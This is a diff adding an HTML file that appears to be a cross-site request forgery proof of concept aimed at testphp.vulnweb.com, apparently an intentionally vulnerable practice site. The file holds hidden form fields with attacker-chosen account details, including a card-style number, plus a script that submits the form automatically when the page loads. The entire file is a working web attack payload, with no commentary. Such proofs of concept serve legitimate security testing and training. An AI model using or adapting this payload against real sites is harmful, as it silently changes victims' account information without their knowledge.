@@ -1,0 +1,15 @@
+<html>
+<body>
+  <form id="csrfForm" action="http://testphp.vulnweb.com/userinfo.php" method="POST">
+    <input type="hidden" name="urname" value="Malicious User">
+    <input type="hidden" name="ucc" value="1234-5678-2300-9000">
+    <input type="hidden" name="uemail" value="malicious@email.com">
+    <input type="hidden" name="uphone" value="123456789">
+    <input type="hidden" name="uaddress" value="Malicious Address">
+    <input type="submit" value="Submit">
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
